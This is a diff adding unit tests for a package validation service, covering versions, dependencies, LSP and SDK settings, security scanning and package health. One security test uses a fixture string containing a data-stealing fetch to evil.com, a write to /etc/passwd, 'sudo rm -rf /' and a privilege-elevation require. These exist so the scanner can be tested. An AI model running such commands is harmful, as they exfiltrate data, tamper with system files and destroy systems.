@@ -717,4 +717,590 @@ describe('PackageValidationService', () => {
       }
     });
   });
+
+  describe('version validation edge cases', () => {
+    it('should handle version parsing errors gracefully', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+      const installPath = InstallationPath.create('/path/to/package');
+
+      if (installPath.isErr()) {
+        throw new Error('Failed to create installation path');
+      }
+
+      // Mock manifest to return invalid version formats
+      const mockManifest = pkg.getManifest();
+      vi.mocked(mockManifest.getRequiredProofEditorVersion).mockReturnValue('invalid.version');
+      vi.mocked(mockManifest.getRequiredNodeVersion).mockReturnValue('also.invalid');
+
+      const result = await service.validatePackage(pkg, installPath.value, {
+        validateSDKCompliance: true,
+      });
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        expect(validationResult.isValid).toBe(false);
+        expect(validationResult.errors.some((e) => e.includes('Incompatible'))).toBe(true);
+      }
+    });
+
+    it('should validate version format in manifest validation', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+
+      // Mock manifest with invalid version format
+      const mockManifest = pkg.getManifest();
+      vi.mocked(mockManifest.getVersion).mockReturnValue('invalid.version.format');
+
+      const result = await service.validatePackage(pkg);
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        expect(validationResult.isValid).toBe(false);
+        expect(validationResult.errors.some((e) => e.includes('Invalid version format'))).toBe(
+          true,
+        );
+      }
+    });
+  });
+
+  describe('dependency validation edge cases', () => {
+    it('should handle dependencies with empty names', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+
+      // Mock manifest with invalid dependency
+      const mockManifest = pkg.getManifest();
+      const deps = new Map();
+      deps.set('', { getConstraintString: () => '^1.0.0' });
+      deps.set('valid-dep', { getConstraintString: () => '' });
+      vi.mocked(mockManifest.getDependencies).mockReturnValue(deps);
+
+      const result = await service.validatePackage(pkg);
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        expect(validationResult.isValid).toBe(false);
+        expect(
+          validationResult.errors.some((e) => e.includes('Dependency name cannot be empty')),
+        ).toBe(true);
+        expect(
+          validationResult.errors.some((e) =>
+            e.includes('Dependency version constraint cannot be empty'),
+          ),
+        ).toBe(true);
+      }
+    });
+
+    it('should handle trimmed empty dependency constraints', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+
+      const mockManifest = pkg.getManifest();
+      const deps = new Map();
+      deps.set('  ', { getConstraintString: () => '  ' });
+      vi.mocked(mockManifest.getDependencies).mockReturnValue(deps);
+
+      const result = await service.validatePackage(pkg);
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        expect(validationResult.isValid).toBe(false);
+        expect(
+          validationResult.errors.some((e) => e.includes('Dependency name cannot be empty')),
+        ).toBe(true);
+        expect(
+          validationResult.errors.some((e) =>
+            e.includes('Dependency version constraint cannot be empty'),
+          ),
+        ).toBe(true);
+      }
+    });
+  });
+
+  describe('LSP configuration validation edge cases', () => {
+    it('should handle LSP configuration with empty command array', async () => {
+      const pkg = createMockPackage('lsp-package', '1.0.0', { hasLSPSupport: true });
+      const installPath = InstallationPath.create('/path/to/package');
+
+      if (installPath.isErr()) {
+        throw new Error('Failed to create installation path');
+      }
+
+      const mockManifest = pkg.getManifest();
+      vi.mocked(mockManifest.hasLSPSupport).mockReturnValue(true);
+      vi.mocked(mockManifest.getLSPDesktopConfiguration).mockReturnValue({
+        command: [],
+        args: ['--stdio'],
+        transport: 'stdio',
+      });
+
+      const result = await service.validatePackage(pkg, installPath.value, {
+        validateSDKCompliance: true,
+      });
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        expect(validationResult.isValid).toBe(false);
+        expect(
+          validationResult.errors.some((e) => e.includes('LSP desktop command is required')),
+        ).toBe(true);
+      }
+    });
+
+    it('should handle invalid LSP transport types', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+
+      const mockManifest = pkg.getManifest();
+      vi.mocked(mockManifest.hasLSPSupport).mockReturnValue(true);
+      vi.mocked(mockManifest.getLSPDesktopConfiguration).mockReturnValue({
+        command: ['lsp-server'],
+        args: ['--stdio'],
+        transport: 'invalid-transport' as any,
+      });
+      vi.mocked(mockManifest.getLSPMobileConfiguration).mockReturnValue({
+        transport: 'invalid-mobile-transport' as any,
+      });
+
+      const result = await service.validatePackage(pkg);
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        expect(validationResult.isValid).toBe(false);
+        expect(
+          validationResult.errors.some((e) =>
+            e.includes('LSP desktop transport must be stdio or websocket'),
+          ),
+        ).toBe(true);
+        expect(
+          validationResult.errors.some((e) =>
+            e.includes('LSP mobile transport must be websocket or http'),
+          ),
+        ).toBe(true);
+      }
+    });
+
+    it('should handle mobile LSP HTTP configuration missing endpoint', async () => {
+      const pkg = createMockPackage('lsp-package', '1.0.0', { hasLSPSupport: true });
+      const installPath = InstallationPath.create('/path/to/package');
+
+      if (installPath.isErr()) {
+        throw new Error('Failed to create installation path');
+      }
+
+      const mockManifest = pkg.getManifest();
+      vi.mocked(mockManifest.hasLSPSupport).mockReturnValue(true);
+      vi.mocked(mockManifest.getLSPMobileConfiguration).mockReturnValue({
+        transport: 'http',
+        // Missing endpoint
+      } as any);
+
+      const result = await service.validatePackage(pkg, installPath.value, {
+        validateSDKCompliance: true,
+      });
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        expect(validationResult.isValid).toBe(false);
+        expect(
+          validationResult.errors.some((e) =>
+            e.includes('LSP mobile HTTP configuration requires endpoint URL'),
+          ),
+        ).toBe(true);
+      }
+    });
+  });
+
+  describe('SDK validation edge cases', () => {
+    it('should handle missing SDK interfaces in implementation', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+      const installPath = InstallationPath.create('/path/to/package');
+
+      if (installPath.isErr()) {
+        throw new Error('Failed to create installation path');
+      }
+
+      // Mock package to expect certain SDK interfaces
+      vi.mocked(pkg.getSDKInterfaces).mockReturnValue([
+        {
+          name: 'TestInterface',
+          version: '1.0.0',
+          methods: ['method1', 'method2'],
+        },
+      ]);
+
+      // Mock SDK validator to return empty interfaces (nothing implemented)
+      vi.mocked(mockSDKValidator.listImplementedInterfaces).mockResolvedValue(ok([]));
+
+      const result = await service.validatePackage(pkg, installPath.value, {
+        validateSDKCompliance: true,
+      });
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        expect(validationResult.isValid).toBe(false);
+        expect(
+          validationResult.errors.some((e) =>
+            e.includes('Missing required SDK interface: TestInterface'),
+          ),
+        ).toBe(true);
+      }
+    });
+
+    it('should handle SDK interface with missing methods', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+      const installPath = InstallationPath.create('/path/to/package');
+
+      if (installPath.isErr()) {
+        throw new Error('Failed to create installation path');
+      }
+
+      // Expected interface
+      vi.mocked(pkg.getSDKInterfaces).mockReturnValue([
+        {
+          name: 'TestInterface',
+          version: '1.0.0',
+          methods: ['method1', 'method2', 'method3'],
+        },
+      ]);
+
+      // Implemented interface (missing some methods)
+      vi.mocked(mockSDKValidator.listImplementedInterfaces).mockResolvedValue(
+        ok([
+          {
+            name: 'TestInterface',
+            version: '1.0.0',
+            methods: ['method1'], // Missing method2 and method3
+          },
+        ]),
+      );
+
+      const result = await service.validatePackage(pkg, installPath.value, {
+        validateSDKCompliance: true,
+      });
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        expect(validationResult.isValid).toBe(false);
+        expect(
+          validationResult.errors.some((e) => e.includes('missing methods: method2, method3')),
+        ).toBe(true);
+      }
+    });
+
+    it('should handle SDK version compatibility warnings', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+      const installPath = InstallationPath.create('/path/to/package');
+
+      if (installPath.isErr()) {
+        throw new Error('Failed to create installation path');
+      }
+
+      vi.mocked(pkg.getSDKInterfaces).mockReturnValue([
+        {
+          name: 'TestInterface',
+          version: '2.0.0',
+          methods: ['method1'],
+        },
+      ]);
+
+      vi.mocked(mockSDKValidator.listImplementedInterfaces).mockResolvedValue(
+        ok([
+          {
+            name: 'TestInterface',
+            version: '1.5.0', // Lower version
+            methods: ['method1'],
+          },
+        ]),
+      );
+
+      // Mock version compatibility to return false
+      vi.mocked(mockSDKValidator.checkVersionCompatibility).mockReturnValue(ok(false));
+
+      const result = await service.validatePackage(pkg, installPath.value, {
+        validateSDKCompliance: true,
+      });
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        expect(validationResult.isValid).toBe(true); // Should still be valid, just warnings
+        expect(validationResult.warnings.some((w) => w.includes('version mismatch'))).toBe(true);
+      }
+    });
+
+    it('should handle SDK validator version check errors', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+      const installPath = InstallationPath.create('/path/to/package');
+
+      if (installPath.isErr()) {
+        throw new Error('Failed to create installation path');
+      }
+
+      vi.mocked(pkg.getSDKInterfaces).mockReturnValue([
+        {
+          name: 'TestInterface',
+          version: '1.0.0',
+          methods: ['method1'],
+        },
+      ]);
+
+      vi.mocked(mockSDKValidator.listImplementedInterfaces).mockResolvedValue(
+        ok([
+          {
+            name: 'TestInterface',
+            version: '1.0.0',
+            methods: ['method1'],
+          },
+        ]),
+      );
+
+      // Mock version compatibility check to return error
+      vi.mocked(mockSDKValidator.checkVersionCompatibility).mockReturnValue(
+        err(new PackageValidationError('Version check failed')),
+      );
+
+      const result = await service.validatePackage(pkg, installPath.value, {
+        validateSDKCompliance: true,
+      });
+
+      expect(result.isErr()).toBe(true);
+      if (result.isErr()) {
+        expect(result.error.message).toBe('Version check failed');
+      }
+    });
+
+    it('should handle interface implementation error lookup', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+      const installPath = InstallationPath.create('/path/to/package');
+
+      if (installPath.isErr()) {
+        throw new Error('Failed to create installation path');
+      }
+
+      vi.mocked(pkg.getSDKInterfaces).mockReturnValue([
+        {
+          name: 'TestInterface',
+          version: '1.0.0',
+          methods: ['method1'],
+        },
+      ]);
+
+      // Mock to return an interface that doesn't match when looked up
+      vi.mocked(mockSDKValidator.listImplementedInterfaces).mockResolvedValue(
+        ok([
+          {
+            name: 'TestInterface',
+            version: '1.0.0',
+            methods: ['method1'],
+          },
+          {
+            name: 'OtherInterface',
+            version: '1.0.0',
+            methods: ['otherMethod'],
+          },
+        ]),
+      );
+
+      // This will trigger the "implementation error" case where the interface is found but lookup fails
+      const originalFind = Array.prototype.find;
+      Array.prototype.find = function <T>(
+        predicate: (value: T, index: number, obj: T[]) => unknown,
+      ) {
+        if (this.length > 0 && this[0].name === 'TestInterface') {
+          return undefined; // Simulate find returning undefined
+        }
+        return originalFind.call(this, predicate);
+      };
+
+      try {
+        const result = await service.validatePackage(pkg, installPath.value, {
+          validateSDKCompliance: true,
+        });
+
+        expect(result.isOk()).toBe(true);
+        if (result.isOk()) {
+          const validationResult = result.value;
+          expect(validationResult.isValid).toBe(false);
+          expect(validationResult.errors.some((e) => e.includes('implementation error'))).toBe(
+            true,
+          );
+        }
+      } finally {
+        Array.prototype.find = originalFind;
+      }
+    });
+  });
+
+  describe('security validation edge cases', () => {
+    it('should handle file read errors during security validation', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+      const installPath = InstallationPath.create('/path/to/package');
+
+      if (installPath.isErr()) {
+        throw new Error('Failed to create installation path');
+      }
+
+      vi.mocked(mockFileSystem.listFiles).mockResolvedValue(ok(['script.js']));
+      vi.mocked(mockFileSystem.isExecutable).mockResolvedValue(false);
+      vi.mocked(mockFileSystem.readFile).mockResolvedValue(
+        err(new Error('Read permission denied')),
+      );
+
+      const result = await service.validatePackage(pkg, installPath.value, {
+        checkSecurityPolicies: true,
+      });
+
+      // Should still succeed even if file can't be read
+      expect(result.isOk()).toBe(true);
+    });
+
+    it('should detect all security patterns in a complex file', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+      const installPath = InstallationPath.create('/path/to/package');
+
+      if (installPath.isErr()) {
+        throw new Error('Failed to create installation path');
+      }
+
+      const maliciousContent = `
+        const fs = require('fs');
+        fetch('https://evil.com/steal-data');
+        fs.writeFile('/etc/passwd', 'hacked');
+        process.chdir('/root');
+        sudo rm -rf /
+        const runas = require('runas');
+        // This file requires administrator privileges
+      `;
+
+      vi.mocked(mockFileSystem.listFiles).mockResolvedValue(ok(['malicious.js']));
+      vi.mocked(mockFileSystem.isExecutable).mockResolvedValue(false);
+      vi.mocked(mockFileSystem.readFile).mockResolvedValue(ok(maliciousContent));
+
+      const result = await service.validatePackage(pkg, installPath.value, {
+        checkSecurityPolicies: true,
+      });
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        expect(validationResult.warnings.some((w) => w.includes('Network access'))).toBe(true);
+        expect(validationResult.warnings.some((w) => w.includes('File system access'))).toBe(true);
+        expect(validationResult.warnings.some((w) => w.includes('Elevated permissions'))).toBe(
+          true,
+        );
+      }
+    });
+
+    it('should handle user consent requirements', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+      const installPath = InstallationPath.create('/path/to/package');
+
+      if (installPath.isErr()) {
+        throw new Error('Failed to create installation path');
+      }
+
+      // Mix of executable files and risky scripts
+      vi.mocked(mockFileSystem.listFiles).mockResolvedValue(ok(['installer.exe', 'config.js']));
+      vi.mocked(mockFileSystem.isExecutable).mockImplementation(async (file) =>
+        file.endsWith('.exe'),
+      );
+      vi.mocked(mockFileSystem.readFile).mockResolvedValue(
+        ok('const fs = require("fs"); fetch("https://api.example.com");'),
+      );
+
+      const result = await service.validatePackage(pkg, installPath.value, {
+        checkSecurityPolicies: true,
+      });
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        // Should have warnings for executable, network access, and file system access
+        // User consent should be required due to executable + network + filesystem
+        expect(validationResult.warnings.length).toBeGreaterThan(2);
+      }
+    });
+  });
+
+  describe('package health validation edge cases', () => {
+    it('should handle package health check errors', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+
+      // Mock package health check to return error
+      vi.mocked((pkg as any).checkPackageHealth).mockReturnValue({
+        isErr: () => true,
+        error: { message: 'Package corrupted' },
+      });
+
+      const result = await service.validatePackage(pkg);
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        expect(validationResult.isValid).toBe(false);
+        expect(
+          validationResult.errors.some((e) =>
+            e.includes('Package health check failed: Package corrupted'),
+          ),
+        ).toBe(true);
+      }
+    });
+
+    it('should handle package health check with undefined error message', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+
+      vi.mocked((pkg as any).checkPackageHealth).mockReturnValue({
+        isErr: () => true,
+        error: {},
+      });
+
+      const result = await service.validatePackage(pkg);
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        expect(validationResult.isValid).toBe(false);
+        expect(validationResult.errors.some((e) => e.includes('Unknown error'))).toBe(true);
+      }
+    });
+
+    it('should handle missing package methods gracefully', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+
+      // Remove some mocked methods to test fallback behavior
+      delete (pkg as any).checkPackageHealth;
+      delete (pkg as any).checkCircularDependencies;
+      delete (pkg as any).getKeywords;
+      delete (pkg as any).getAuthor;
+
+      const result = await service.validatePackage(pkg);
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        // Should still validate but without the missing checks
+        expect(validationResult).toBeDefined();
+      }
+    });
+
+    it('should handle author object with missing name property', async () => {
+      const pkg = createMockPackage('test-package', '1.0.0');
+
+      vi.mocked((pkg as any).getAuthor).mockReturnValue({ email: 'test@example.com' });
+
+      const result = await service.validatePackage(pkg);
+
+      expect(result.isOk()).toBe(true);
+      if (result.isOk()) {
+        const validationResult = result.value;
+        expect(validationResult.warnings.some((w) => w.includes('author information'))).toBe(true);
+      }
+    });
+  });
 });
